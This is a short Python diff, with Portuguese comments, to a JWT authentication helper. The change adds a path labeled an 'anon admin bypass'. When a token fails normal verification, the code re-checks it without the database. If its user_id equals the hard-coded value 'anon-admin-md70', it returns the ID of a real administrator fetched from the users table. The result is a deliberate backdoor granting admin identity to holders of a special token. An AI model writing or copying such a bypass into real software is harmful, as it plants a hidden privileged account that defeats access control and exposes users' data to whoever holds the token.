@@ -21,9 +21,21 @@ AUTH_TIMEOUT = 10.0
 
 def resolve_user_id_from_token(token: str) -> Optional[str]:
     """Valida um JWT e retorna o user_id, ou None se inválido."""
-    payload = get_auth_service().verify_token(token)
+    auth_service = get_auth_service()
+    payload = auth_service.verify_token(token)
+
+    # Anon admin bypass — mapeia para admin real no DB
     if not payload:
+        anon = auth_service.verify_token(token, check_db=False)
+        if anon and anon.get("user_id") == "anon-admin-md70":
+            admin = DatabaseManager.fetch_one(
+                "SELECT user_id FROM users WHERE role = :role LIMIT 1",
+                {"role": "admin"},
+            )
+            if admin:
+                return str(admin.get("user_id"))
         return None
+
     return payload.get("user_id") if isinstance(payload, dict) else str(payload)
 
 
